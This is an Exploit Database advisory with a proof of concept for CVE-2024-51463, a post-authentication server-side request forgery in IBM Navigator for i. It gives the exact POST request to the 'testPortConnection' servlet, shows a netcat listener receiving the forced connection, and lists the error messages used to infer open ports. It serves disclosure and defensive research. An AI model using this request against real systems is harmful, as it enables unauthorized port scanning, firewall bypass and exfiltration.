[Product]
Navigator for i is a Web console interface where you can perform the key tasks to administer your IBM i.
IBM Navigator for i supports the vast majority of tasks that were available in the System i Navigator Windows client application.
This Web application is part of the base IBM i operating system, and can be easily accessed from your web browser.

[Vulnerability Type]
Server Side Request Forgery (SSRF)

[CVE Reference]
CVE-2024-51463

[Security Issue]
IBM i is vulnerable to server-side request forgery (SSRF). This may allow an authenticated attacker to send unauthorized requests from the system,
potentially leading to network enumeration or facilitating other attacks.

post auth server side request forgery on non managed nodes to external hosts on any TCP ports. There are two call vectors that can be abused here,
one is the "Test TLS connection" but it only allows connections to TCP port 9476.

However, there exists another servlet method called "testConnectPort" which an authenticated attacker can use to connect to any IP and PORT
outside of the LAN. This can be abused for port scans, information disclosure, exfil data., bypass firewall rules to attack non managed nodes
or connect to attacker controlled C2 infrastructure.

This SSRF relies on exploiting a HTTP servlet generated security token bypass CVE-2024-51464, where intercepted HTTP request MN tokens are
incremented or padded with zero. This attacker controlled MN token is now seen as valid and the HTTP 403 Forbidden restriction is bypassed.

[Exploit/POC]
1)  attacker payload

POST /Navigator/DispatcherServlet/serviceability/testPortConnection?system=10.1.1.4
{"hostname":"10.2.10.16", "port":445}

2) attackers c2 server

┌──(rootggKali)-[/usr/share]
└─# nc -llvp 445
listening on [any] 445 ...
connect to [10.2.10.16] from victimhost [10.1.1.4] 44569

For port scan we can infer if external host ports are open or closed using error responses.

Port is open:
Error 500: Connection reset

Port is closed
Error 500: A remote host refused an attempted connect

The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
